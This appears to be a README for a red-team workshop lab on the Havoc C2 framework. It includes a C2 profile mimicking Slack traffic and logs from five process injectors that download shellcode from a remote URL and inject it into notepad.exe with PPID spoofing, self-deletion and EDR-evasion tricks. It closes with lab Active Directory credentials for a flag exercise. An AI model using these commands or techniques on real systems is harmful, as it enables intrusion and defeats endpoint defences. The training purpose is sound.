# Red Team Ops: Havoc 101
![](./assets/poster.png)
Learn how to compromise an Active Directory Infrastructure by simulating adversarial Tactics, Techniques and Procedures (TTPs) using Havoc Framework. 

## Agenda
### **Chapter 1: Intro to C2**
1. Basic Functionalities of Havoc
2. Malleable C2 Profile
3. C2 Infrastructure Design

### **Chapter 2: OPSEC & Evasion**
1. Built-In Evasion Mechanism of Havoc
2. AV Evasion (Custom Injector)
3. EDR Bypass
4. Post-Exploitation Defense Evasion

### **Chapter 3: Active Directory**
> [Blogpost](https://pikaroot.github.io/blogs/2023-02-25-HAVOC_Framework) by [@pikaroot](https://github.com/pikaroot)
1. Local Privilege Escalation
2. Kerberos Attacks
3. Lateral Movement
4. Pivoting

## Lab Setup

| **Virtual Machine** | **Username**  | **Password** | **RAM** | **Storage** | **Note**       | **Used In (Chapter)** | **Download Link** |
|---------------------|:-------------:|:------------:|:-------:|:-----------:|:--------------:|:---------------------:|:-----------------:|
| Attacker Linux      | havoc         | havoc        | 4 GB    | 18 GB       | Semi-Mandatory | 1, 2, 3               | [OneDrive](https://cloudmails-my.sharepoint.com/:f:/g/personal/tp059618_mail_apu_edu_my/EhmHmpQIqfFMvfwCsD4Ytm4BDsHFM3SfXtqrPvHpoqepLQ?e=wICgrL)                 |
| Attacker Windows    | Havoc         | havoc        | 4 GB    | 25 GB       | Mandatory      | 1, 2                  | [OneDrive](https://cloudmails-my.sharepoint.com/:f:/g/personal/tp059618_mail_apu_edu_my/EhmHmpQIqfFMvfwCsD4Ytm4BDsHFM3SfXtqrPvHpoqepLQ?e=wICgrL)                 |
| Redirector          | redirector    | havoc        | 1 GB    | 5 GB        | Optional       | 1, 2                  | [OneDrive](https://cloudmails-my.sharepoint.com/:f:/g/personal/tp059618_mail_apu_edu_my/EhmHmpQIqfFMvfwCsD4Ytm4BDsHFM3SfXtqrPvHpoqepLQ?e=wICgrL)                 |
| Domain Controller   | -             | -            | 2 GB    | 15 GB       | Mandatory      | 3                     | [OneDrive](https://cloudmails-my.sharepoint.com/:f:/g/personal/tp059494_mail_apu_edu_my/Ejkf_fRz4J9PhtrrxaynvbgBvFBRsMOJFRkKiAjuY9Qtuw)                 |
| Workstation 1       | -             | -            | 1 GB    | 15 GB       | Mandatory      | 3                     | [OneDrive](https://cloudmails-my.sharepoint.com/:f:/g/personal/tp059494_mail_apu_edu_my/Ejkf_fRz4J9PhtrrxaynvbgBvFBRsMOJFRkKiAjuY9Qtuw)                 |
| Workstation 2       | -             | -            | 1 GB    | 15 GB       | Mandatory      | 3                     | [OneDrive](https://cloudmails-my.sharepoint.com/:f:/g/personal/tp059494_mail_apu_edu_my/Ejkf_fRz4J9PhtrrxaynvbgBvFBRsMOJFRkKiAjuY9Qtuw)                 |

## Chapter 1: Intro to C2
### C2 Malleable Profile
```
Teamserver {
	Host = "0.0.0.0"
	Port = 40056

	Build {
	    Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
	    Nasm = "/usr/bin/nasm"
	}
}

WebHook {
    Discord {
        # WEBHOOK TOKEN HERE
        Url = ""

        AvatarUrl = "https://raw.githubusercontent.com/HavocFramework/Havoc/main/Assets/Havoc.png"

        User = "Havoc"
    }
}

Operators {
	user "5pider" {
		Password = "password"
	}

	user "havoc" {
		Password = "password"
	}
}

Listeners {
    Http {
        Name         = "HTTP"
        Hosts        = [
            "192.168.231.131", # CHANGE TO TEAM SERVER IP
        ]
        HostBind     = "192.168.231.131" # CHANGE TO TEAM SERVER IP
        HostRotation = "round-robin"
        Port         = 80
        Secure       = false
        UserAgent    = "Slack/415620 CFNetwork/1240.0.4 Darwin/20.5.0"

        Headers = [
            "Host: msdevchat.slack.com",
            "X-Via: haproxy-www-w6k7",
            "X-Slack-Req-Id: 6319165c-f976-4d0666532",
            "X-Slack-Backend: h",
        ]
    }

    Http {
        Name         = "HTTPS"
        Hosts        = [
            "192.168.231.129", # CHANGE TO REDIRECTOR IP
        ]
        HostBind     = "0.0.0.0" # DO NOT CHANGE
        HostRotation = "round-robin"
        Port         = 443
        Secure       = true
        UserAgent    = "Slack/415620 CFNetwork/1240.0.4 Darwin/20.5.0"

        Headers = [
            "Host: msdevchat.slack.com",
            "X-Via: haproxy-www-w6k7",
            "X-Slack-Req-Id: 6319165c-f976-4d0666532",
            "X-Slack-Backend: h",
        ]
    }

    Smb {
        Name     = "SMB"
        PipeName = "ntsvcs"
    }
}

Demon {
    Sleep = 5

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
```

### C2 Infrastructure Design
![](./assets/c2_infrastructure.png)

#### [[Redirector]](https://github.com/WesleyWong420/RedTeamOps-Havoc-101/blob/main/assets/Redirector.MD) [[Stager]](https://github.com/WesleyWong420/RedTeamOps-Havoc-101/blob/main/assets/Stager.MD)

## Chapter 2: OPSEC & Evasion
### Runner
Runner is the 1st out of 5 Proof-of-Concept Process Injectors that takes an arbitrary shellcode from a remote URL and perform shellcode injection on a sacrificial process `notepad.exe` using Win32 API calls. It also supports Parent Process ID (PPID) Spoofing, allowing the sacrificial process to spawn under an arbitrary process using it's PID. If the target `-t, --target` is not specified, it will perform self-injection instead.

**OPSEC Tips:** Allocating RWX region is a major outlier for detection as programs will rarely have memory region of RWX. Always allocate RW then flip it to RX.
```
C:\>Runner.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k

                 /\
                ( ;`~v/~~~ ;._
             ,/'"/^) ' < o\  '".~'\\\--,
           ,/",/W  u '`. ~  >,._..,   )'
          ,/'  w  ,U^v  ;//^)/')/^\;~)'
       ,/"'/   W` ^v  W |;         )/'
     ;''  |  v' v`" W }  \\
    "    .'\    v  `v/^W,) '\)\.)\/)
             `\   ,/,)'   ''')/^"-;'
                  \
                ".
               \    Runner
               
Process Injector 1: Runner (Win32 API)

  -u, --url      Required. Remote URL address for raw shellcode.

  -t, --target   Specify the target/victim process. Default: Self-injection

  -p, --parent   Spoof victim process under a Parent Process ID (This option is ignored for self-injection)

  -k, --kill     Enable self-destruct to auto wipe file from disk.

  -h, --help     Display help screen manual.
  
|--------------
| Payload       : http://192.168.231.128:9090/demon.bin
| Process       : C:\Windows\System32\notepad.exe
| PPID Spoofing : 4160
| Self Destruct : True
|--------------

[>] CreateProcessW()
    |-> Target Process Created!
    |-> PID: 12180

[>] Fetching Payload

[>] VirtualAllocEx()
    |-> Base Address: 0x15A89D70000

[>] WriteProcessMemory()
    |-> Shellcode Injected!

[>] VirtualProtectEx()
    |-> Flipping Memory Protection!

[>] CreateRemoteThread()
    |-> Shellcode Executed!

[>] DeleteProcThreadAttributeList()
    |-> Deleting Process Artifacts!

[>] CloseHandle()
    |-> Closing Process Handle!

[>] CloseHandle()
    |-> Closing Thread Handle!

[>] Runner.exe removed from disk!
```

### Stalker
Stalker is a Proof-of-Concept loader for code injection using NT\*API calls to defeat Kernel32 API Monitoring. All Win32 APIs are mapped to the respective NT level API as follows:
| Win32 API          | NT\*API                                                      |
|--------------------|--------------------------------------------------------------|
| VirtualAllocEx     | NtAllocateVirtualMemory |
| WriteProcessMemory | NtWriteVirtualMemory |
| VirtualProtectEx   | NtProtectVirtualMemory |
| CreateRemoteThread | NtCreateThreadEx |
```
C:\>Stalker.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k

     j                       k
    .K                       Z.
    jM.                     .Mk
    WMk                     jMW
    YMM.       ,,,,,,      .MMY
    `MML;:''```      ```':;JMM'
    /`JMMMk.           .jMMMk'\
    / `GMMMI'         `IMMMO' \
   /    ~~~'           `~~~    \
   /                           \
   |                           |
   |      ;,           ,;      |
   |      Tk           jT      |
    |     `Mk   . .   jM'     |
    |      YK.   Y   .ZY      |
     \     `Kk   |   jZ'     /
     \       `'  |  `'       /
      \          |          /
       \         |         /
       \         |         /
        \        |        /
         \       |       /
         \       |       /
          \      |      /
           \     |     /
           \  |  |  |  /
            \ {| | |} /
             \ ` | ' /
              \  |  /
              \  |  /
               \   /
                \ /
                 ~   Stalker
                    
Process Injector 2: Stalker (Nt*API)

  -u, --url      Required. Remote URL address for raw shellcode.

  -t, --target   Specify the target/victim process. Default: Self-injection

  -p, --parent   Spoof victim process under a Parent Process ID (This option is ignored for self-injection)

  -k, --kill     Enable self-destruct to auto wipe file from disk.

  -h, --help     Display help screen manual.
  
|--------------
| Payload       : http://192.168.231.128:9090/demon.bin
| Process       : C:\Windows\System32\notepad.exe
| PPID Spoofing : 4160
| Self Destruct : True
|--------------

[>] CreateProcessW()
    |-> Target Process Created!
    |-> PID: 13092

[>] Fetching Payload
    |-> Payload retrieved successfully!

[>] NtAllocateVirtualMemory()
    |-> Base Address: 0x23229800000

[>] NtWriteVirtualMemory()
    |-> Shellcode Injected!

[>] NtProtectVirtualMemory()
    |-> Flipping Memory Protection!

[>] NtCreateThreadEx()
    |-> Shellcode Executed!

[>] DeleteProcThreadAttributeList()
    |-> Deleting Process Artifacts!

[>] CloseHandle()
    |-> Closing Process Handle!

[>] CloseHandle()
    |-> Closing Thread Handle!

[>] Stalker.exe removed from disk!
```

### SylantStrike
Home-made Endpoint Detection & Response (EDR) to hook NT*API calls. The hooking logic is not implemented perfectly and has a high chance of false positive. Use only for demonstrating EDR bypass. (Credit to [@CCob](https://github.com/CCob/SylantStrike))
```
PS C:\Users\havoc\Desktop\Tools\SylantStrike\x64\Release> .\SylantStrikeInject.exe --process=Stalker.exe --dll=C:\Users\havoc\Desktop\Tools\SylantStrike\x64\Release\SylantStrike.dll
Waiting for process events
+ Listening for the following processes: stalker.exe

Injecting process Stalker.exe(4312) with DLL C:\Users\havoc\Desktop\Tools\SylantStrike\x64\Release\SylantStrike.dll
```

### Clicker
Clicker is a wrapper used to side-load `Stalker` for demonstrating Process Mitigation Policy. This technique prevents security vendors from reflectively loading EDR DLLs that are not digitally signed by Microsoft. As a result, `kernel32.dll` and `ntdll.dll` of newly spawned processes will not be hooked by EDR vendors unless they have Intermediate Certificates handed out by Microsoft.
```
C:\>Clicker.exe -f ./Stalker.exe -p 4160 -u http://192.168.231.128:9090/demon.bin -t notepad -s 4160

   .:'                                  `:.
  ::'                                    `::
 :: :.                                  .: ::
  `:. `:.             .             .:'  .:'
   `::. `::           !           ::' .::'
       `::.`::.    .' ! `.    .::'.::'
         `:.  `::::'':!:``::::'   ::'
         :'*:::.  .:' ! `:.  .:::*`:
        :: HHH::.   ` ! '   .::HHH ::
       ::: `H TH::.  `!'  .::HT H' :::
       ::..  `THHH:`:   :':HHHT'  ..::
       `::      `T: `. .' :T'      ::'
         `:. .   :         :   . .:'
           `::'               `::'
             :'  .`.  .  .'.  `:
             :' ::.       .:: `:
             :' `:::     :::' `:
              `.  ``     ''  .'
               :`...........':
               ` :`.     .': '
                `:  `"""'  :'   Clicker

Process Injector 3 (Wrapper): Clicker (Process Mitigation Policy)

  -f, --file       Required. Absolute path of file to be executed.

  -p, --parent     Required. Spoof --file under a Parent Process ID.

  -u, --url        Required. Remote URL address for raw shellcode.

  -t, --target     Specify the target/victim process. Default: Self-injection

  -s, --spoof      Spoof --target under a Parent Process ID.

  -h, --help       Display help screen manual.
  
|--------------
| File          : ./Stalker.exe
| PPID Spoofing : 4160
| Argument 1    : http://192.168.231.128:9090/demon.bin
| Argument 2    : notepad
| Argument 3    : 4160
|--------------

[>] CreateProcessW()
    |-> Process Mitigation Policy Enforced!
    |-> Spoofed Parent PID Successfully!
    |-> Target Process Created!
    |-> PID: 19520
```

### Bloater
Bloater is the successor of `Stalker` as it uses the same boilerplate to perform process injection. At runtime, a fresh copy of `ntdll.dll` is loaded into the process. The original `ntdll.dll` that was hooked by EDR is left untouched. All NT*API are exported and called from the clean copy of `ntdll.dll` instead. This EDR evasion method is especially effective because the integrity of EDR hooks are not tampered with.
```
C:\>Bloater.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
                                                                    _
                                                                  _( (~\
           _ _                        /                          ( \> > \
       -/~/ / ~\                     :;                \       _  > /(~\/
      || | | /\ ;\                   |l      _____     |;     ( \/    > >
      _\\)\)\)/ ;;;                  `8o __-~     ~\   d|      \      //
     ///(())(__/~;;\                  "88p;.  -. _\_;.oP        (_._/ /
    (((__   __ \\   \                  `>,% (\  (\./)8"         ;:'  i
    )))--`.'-- (( ;,8 \               ,;%%%:  ./V^^^V'          ;.   ;.
    ((\   |   /)) .,88  `: ..,,;;;;,-::::::'_::\   ||\         ;[8:   ;
     )|  ~-~  |(|(888; ..``'::::8888oooooo.  :\`^^^/,,~--._    |88::  |
     |\ -===- /|  \8;; ``:.      oo.8888888888:`((( o.ooo8888Oo;:;:'  |
     |_~-___-~_|   `-\.   `        `o`88888888b` )) 888b88888P""'     ;
     ; ~~~~;~~         "`--_`.       b`888888888;(.,"888b888"  ..::;-'
       ;      ;              ~"-....  b`8888888:::::.`8888. .:;;;''
          ;    ;                 `:::. `:::OOO:::::::.`OO' ;;;''
     :       ;                     `.      "``::::::''    .'
        ;                           `.   \_              /
      ;       ;                       +:   ~~--  `:'  -';
                                       `:         : .::/    Bloater
          ;                            ;;+_  :::. :..;;;
                                       ;;;;;;,;;;;;;;;,;

Process Injector 4: Bloater (Manual Mapping ntdll.dll)

  -u, --url      Required. Remote URL address for raw shellcode.

  -t, --target   Specify the target/victim process. Default: Self-injection

  -p, --parent   Spoof victim process under a Parent Process ID (This option is ignored for self-injection)

  -k, --kill     Enable self-destruct to auto wipe file from disk.

  -h, --help     Display help screen manual.

|--------------
| Payload       : http://192.168.231.128:9090/demon.bin
| Process       : C:\Windows\System32\notepad.exe
| PPID Spoofing : 4160
| Self Destruct : True
|--------------

[>] Resolving Addresses of ntdll.dll
    |-> Original ntdll.dll: 0x7ff856c10000
    |-> New copy of ntdll.dll: 0x1a068730000
    
[>] CreateProcessW()
    |-> Target Process Created!
    |-> PID: 9168

[>] Fetching Payload
    |-> Payload retrieved successfully!

[>] NtAllocateVirtualMemory()
    |-> Base Address: 0x28D20A30000

[>] NtWriteVirtualMemory()
    |-> Shellcode Injected!

[>] NtProtectVirtualMemory()
    |-> Flipping Memory Protection!

[>] NtCreateThreadEx()
    |-> Shellcode Executed!

[>] DeleteProcThreadAttributeList()
    |-> Deleting Process Artifacts!

[>] CloseHandle()
    |-> Closing Process Handle!

[>] CloseHandle()
    |-> Closing Thread Handle!

[>] Bloater.exe removed from disk!
```

### RatKing
RatKing is an adapted version of `Bloater` on steroids, written in Rust. The intention is to make Reverse Engineering significantly harder.

**NOTE:** RatKing does not support HTTPS payload download and PPID spoofing. Additionally, target process has to be opened manually prior to running RatKing. `--target` must be exact match.
```
C:\>RatKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.exe

              .'''''-,              ,-`````.
              `-.._  |              |  _..-'
                 \    `,          ,'    /
                 '=   ,/          \,   =`
                 '=   (            )   =`
                .\    /            \    /.
               /  `,.'              `.,'  \
               \   `.                ,'   /
                \    \              /    /
                 \   .`.  __.---. ,`.   /
                  \.' .'``        `. `./
                   \.'  -'''-..     `./
                   /  /        '.      \
                  /  / .--  .-'''`      '.
                 '   |    ,---.    _      \
     /``-----._.-.   \   / ,-. '-'   '.   .-._.-----``\
     \__ .     | :    `.' ((O))   ,-.  \  : |     . __/
      `.  '-...\_`     |   '-'   ((O)) |  '_/...-`  .'
 .----..)    `    \     \      /  '-'  / /    '    (..----.
(o      `.  /      \     \    /\     .' /      \  .'      o)
 ```---..   `.     /`.    '--'  '---' .'\     .'   ..---```
         `-.  `.  /`.  `.           .' .'\  .'  .-'
            `..` /   `.'  ` - - - ' `.'   \ '..'
                /    /                \    \
               /   ,'                  `.   \
               \  ,'`.                .'`.  /
                `/    \              /    \'
                 ,=   (              )   =,
                 ,=   '\            /`   =,
   RatKing       /    .'            `.    \
              .-'''  |                |  ```-.
              `......'                `......'

[>] Scanning for notepad.exe...
    |-> Found process!
    |-> PID: 11588

[>] Fetching Payload!
    |-> URL: http://192.168.231.128:9090/demon.bin

[>] Resolving Addresses of ntdll.dll
    |-> Original ntdll.dll: 0x7FF856C10000
    |-> New copy of ntdll.dll: 0x1869DB30000

[>] NtAllocateVirtualMemory()
    |-> Base Address: 0x1ED3C1F0000

[>] NtWriteVirtualMemory()
    |-> Shellcode Injected!

[>] NtProtectVirtualMemory()
    |-> Flipping Memory Protection!

[>] NtCreateThreadEx()
    |-> Shellcode Executed!
```
## Chapter 3: Active Directory
> Before we start, please ensure the **Automatic Sample Submission** in Windows Defender AV is disabled and **Real-Time Protection** is up and running.

### Active Directory Network Diagram
![image](https://user-images.githubusercontent.com/107750005/220150586-d53ed48b-3553-4f5d-8855-a33a59e68e3a.png)

### Active Directory Network Addresses
1. **DC01**
    - **Secure Network**
        - Static IPv4: `10.10.101.131`
        - Subnet Mask: `255.255.255.0`
        - Default Gateway: `10.10.101.1`
        - Preferred DNS: `127.0.0.1`
        - Alternate DNS: `8.8.8.8`

2. **WORKSTATION-01**
    - **External Network**
        - Dynamic IPv4: `192.168.25.xxx` (DHCP will assign)
        - Subnet Mask: `auto-assigned`
        - Default Gateway: `auto-assigned`
        - Preferred DNS: `auto-assigned`
        - Alternate DNS: `auto-assigned`
        
    - **Internal Network**
        - Static IPv4: `10.10.100.128`
        - Subnet Mask: `255.255.255.0`
        - Default Gateway: 
        - Preferred DNS: `10.10.100.129`
        - Alternate DNS: `8.8.8.8`
        
    - **Secure Network**
        - Static IPv4: `10.10.101.129`
        - Subnet Mask: `255.255.255.0`
        - Default Gateway: `10.10.101.1`
        - Preferred DNS: `10.10.101.131`
        - Alternate DNS: `8.8.8.8`

3. **WORKSTATION-02**
    - **Internal Network**
        - Static IPv4: `10.10.100.129`
        - Subnet Mask: `255.255.255.0`
        - Default Gateway: 
        - Preferred DNS: `10.10.100.128`
        - Alternate DNS: `8.8.8.8`
        
    - **Secure Network**
        - Static IPv4: `10.10.101.132`
        - Subnet Mask: `255.255.255.0`
        - Default Gateway: `10.10.101.1`
        - Preferred DNS: `10.10.101.131`
        - Alternate DNS: `8.8.8.8`
        
### Active Directory Users and Computers

| **First Name** | **Last Name** | **Username** | **Password**         | **Group** | **Involvement** |
|----------------|---------------|--------------|----------------------|----------------------------------|---|
|                |               | administrator| `P@$$w0rd!`          | Domain Admins | * |
| Aaron          | Adams         | a.adams      | `C0nc0Rd1776!`       | Senior Management, Domain Admins |   |
| Jonathan       | Taylor        | j.taylor     | `Lexington1776!`     | IT Admins, Administrators |   |
| Jillian        | Anthony       | j.anthony    | `H1dD3nV4ll3y!`      | Engineering |   |
| Tabitha        | Carter        | t.carter     | `AhArGuY5Nm7U3!@`    | Engineering |   |
| Megan          | Phillips      | m.phillips   | `L4k3LiV3L0ve!`      | Engineering, Group Policy Creator Owners |   |
| Richard        | Smith         | r.smith      | `Baseball123!`       | Engineering |   |
| Samantha       | Chisholm      | s.chisholm   | `FallOutBoy1!`       | Sales | * |
| Margaret       | Seitz         | m.seitz      | `Phi11i35@44`        | Engineering | * |
| Aaron          | Tarolli       | a.tarolli    | `Password123!`       | Sales | * |
| Zane           | Dickens       | z.dickens    | `M0t0rH3Ad65^$#`     | Sales |   |

| Machines                   | Local Admin  | Domain Users       |
|----------------------------|--------------|--------------------|
| WORKSTATION-01.havoc.local | s.chisholm   | m.seitz, a.tarolli |
| WORKSTATION-02.havoc.local | m.seitz      |                    |
| DC01.havoc.local           | administrator|                    |

### Active Directory Flag Details
- Flag Format: `HAVOC{MD5}`
- Flag Amount: 3
- Flag Location: `\\COMPUTER-NAME\C$\Users\localadmin-or-administrator\Desktop\flag.txt`

